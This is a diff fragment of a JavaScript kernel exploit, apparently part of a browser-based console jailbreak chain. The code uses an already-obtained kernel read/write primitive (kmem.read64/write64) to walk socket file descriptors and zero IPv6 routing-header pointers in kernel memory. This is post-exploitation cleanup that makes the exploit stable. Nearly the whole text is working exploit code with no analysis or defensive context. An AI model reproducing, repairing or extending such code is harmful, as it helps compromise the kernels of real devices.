@@ -1485,33 +1485,47 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
    var  INPCB_PKTOPTS = 0x118;
     
 function get_fd_data_addr(sock) {
- 
-  const filedescent_addr = ofiles.add(sock * SIZEOF_OFILES);
+   const filedescent_addr = ofiles
+    + BigInt(sock) * BigInt(SIZEOF_OFILES);
 
   const file_addr = kmem.read64(filedescent_addr);
-
   return kmem.read64(file_addr);
 }
-
-  function get_sock_pktopts(sock) {
-       const fd_data = get_fd_data_addr(sock);
-
-  const pcb = kmem.read64(fd_data.add(SO_PCB));
-  return kmem.read64(pcb.add(INPCB_PKTOPTS));
+function get_sock_pktopts(sock) {
+  const fd_data = get_fd_data_addr(sock);
+  const pcb     = kmem.read64(fd_data + BigInt(SO_PCB));
+  return kmem.read64(pcb + BigInt(INPCB_PKTOPTS));
 }
+
+try{  
 
 
     for (let i = 0; i < sds.length; i++) {
-  const pkto = get_sock_pktopts(sds[i]);
-  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
-}
+    const pkto = get_sock_pktopts(sds[i]);     // BigInt
+    const ptr  = pkto + off_ip6po_rthdr;       // BigInt + BigInt
+    kmem.write64(ptr, 0n);
+  }
 
-const reclaimPkto = get_sock_pktopts(reclaim_sock);
-kmem.write64(reclaimPkto.add(off_ip6po_rthdr), 0);
+ {
+    const pkto = get_sock_pktopts(reclaim_sock);
+    kmem.write64(pkto + off_ip6po_rthdr, 0n);
+  }
 
-kmem.write64(worker_pktopts.add(off_ip6po_rthdr), 0);
+ 
+  kmem.write64(worker_pktopts + off_ip6po_rthdr, 0n);
+
+ 
     
 
+log("routing‐header IPv6 fields zeroed");
+   }
+
+    catch(e){
+
+        alert(e.message);
+    }
+
+    
 /*    var  SIZEOF_OFILES = 0x8;
    var SO_PCB        = 0x18;
   var  INPCB_PKTOPTS = 0x118;
